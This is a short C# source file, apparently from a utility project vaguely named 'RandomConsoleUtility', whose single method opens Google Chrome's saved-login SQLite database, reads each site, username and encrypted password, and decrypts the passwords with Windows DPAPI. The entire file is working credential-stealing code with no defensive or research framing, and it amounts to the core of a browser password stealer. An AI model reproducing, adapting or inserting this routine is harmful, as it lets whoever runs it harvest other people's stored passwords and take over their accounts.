using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace RandomConsoleUtility
{
	public static class Start
	{
		public static IEnumerable<string> DecryptChromePasswords(string pathToData)
		{
			// Example input: "Data Source=C:\Windows\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data"

			string sql = @"SELECT action_url, username_value, password_value FROM logins";
			using (var conn = new SQLiteConnection(pathToData))
			{
				conn.Open();
				var command = new SQLiteCommand(sql, conn);
				using (var reader = command.ExecuteReader())
				{
					while (reader.Read())
						yield return $"{reader["username_value"]}: {System.Text.Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[])reader["password_value"], null, DataProtectionScope.CurrentUser))}";
				}
			}
		}
	}
}
